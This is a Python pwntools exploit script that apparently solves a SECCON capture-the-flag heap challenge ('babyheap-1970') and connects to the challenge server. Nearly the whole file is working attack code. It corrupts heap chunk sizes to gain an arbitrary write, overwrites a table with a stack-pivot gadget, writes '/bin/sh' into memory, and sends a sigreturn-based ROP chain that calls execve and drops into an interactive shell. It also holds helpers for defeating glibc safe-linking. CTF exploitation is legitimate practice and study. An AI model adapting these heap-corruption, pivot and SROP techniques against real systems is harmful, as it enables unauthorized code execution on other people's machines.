import random
from pwn import *
import argparse
import time


context.arch = 'amd64'
context.log_level = 'error'

# host = sys.argv[1]
# port = int(sys.argv[2])

# host = "127.0.0.1"
# port = 3001
host = "babyheap-1970.dom.seccon.games"
port = 9999

if host in ["127.0.0.1", "localhost"]:
    is_gaibu = False
else:
    is_gaibu = True
is_gaibu = False
log = False


def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


r = remote(host, port)


def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)


def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s


def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')


def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)


def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)


def interactive():
    r.interactive()

# libc safe linking decrypt


def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


def encrypt(val, addr):
    return val ^ (addr >> 12)

####################################


def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send


def rs(s, new_line=True, r=b': '):
    recvuntil(r)
    # s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r


def sa(r, s, new_line=True):
    rs(s, new_line, r)


def realloc(id, size):
    recvuntil(b">")
    sendline(b"1")
    rs(str(id).encode())
    rs(str(size).encode())


def edit(id, idx, value):
    recvuntil(b">")
    sendline(b"2")
    rs(str(id).encode())
    rs(str(idx).encode())
    rs(str(value).encode())


def edit_64(id, idx, value):
    for i in range(4):
        edit(id, idx+i, (value >> (16*i)) & 0xffff)


a = 0
b = 1
c = 2
d = 3


victim_addr = 0x42e840

target = b
realloc(target, 36)
realloc(target+1, 36)

edit(target+1, 0, 0xbeef)

# overwrite the size
edit(target, 36, 0x8081)
realloc(target + 1, 44)
edit(target + 1, 36, 0x8061)
edit(target + 1, 37, 0xf)
# 0x430ea0

edit_64(target + 1, 40, victim_addr)

realloc(d, 36)
realloc(a, 36)

aaw = a
edit(aaw, 36, 0x80)


def set_d_addr(addr):
    edit_64(aaw, 56, addr)


def set(addr, val):
    set_d_addr(addr)
    edit_64(d, 0, val)


syscall_ret = 0x4018e7
pop_rax_ret = 0x413563
# 0x4022ab: mov r15, qword [rdi+0x28] ; mov rsp, qword [rdi+0x30] ; jmp qword [rdi+0x38] ; (1 found)
gadget = 0x4022ab
ret = 0x41722f

# addrs = [0x425680, 0x425590, 0x425458, 0x425270,
#         0x425990, 0x426b70, 0x426bd8, 0x426cd0, 0x42e9a8]
# addrs = [0x00430000]
addrs = [0x00430000]
avoid = [0x140]
for base in addrs:
    for i in range(0x140, 0x168):
        if i in avoid:
            continue
        if i == 0x167:
            val = gadget
        else:
            val = i
        addr = base + i*8
        print(hex(i), hex(addr))
        # set(addr, 4199360)
        set(addr, val)

# target = 0x167
# base = 0x00430000
# set(base + target * 8, 0xdeadbeef)

# set(0x42f0a8 + 8, 0xdeadbeef)


rdi = 0x430980

pivot = rdi + 0x30
jump_addr = rdi + 0x38
pivot_stack = 0x0042f000 - 0x1000
binsh = 0x0042f000 - 0x2000

print("pivot:",  hex(pivot_stack))
print("jump_addr:",  hex(jump_addr))

set(pivot, pivot_stack)
set(jump_addr, ret)
set(binsh, u64(b"/bin/sh\x00"))


frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = [
    pop_rax_ret,
    0xf,
    syscall_ret
]
payload = b''.join(map(p64, payload)) + bytes(frame)
print(len(payload))
for x in range(0, len(payload), 8):
    val = just_u64(payload[x:x+8])
    print(hex(val))
    set(pivot_stack + x, val)

wait_for_attach()
realloc(b, 80)

# edit(c+1, 0, 0xbeef)
# realloc(0, 40)
interactive()
